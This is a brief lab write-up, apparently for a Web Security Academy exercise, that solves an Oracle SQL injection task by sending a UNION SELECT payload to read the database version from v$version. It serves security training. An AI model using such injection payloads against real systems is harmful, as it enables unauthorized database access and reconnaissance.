# SQL injection attack, querying the database type and version on Oracle

1. Inject a single quote and observe the error
2. Send the following request to solve the lab

```
https://0ab5008b03bafed7804a0dfd000700ae.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,banner+FROM+v$version--
```

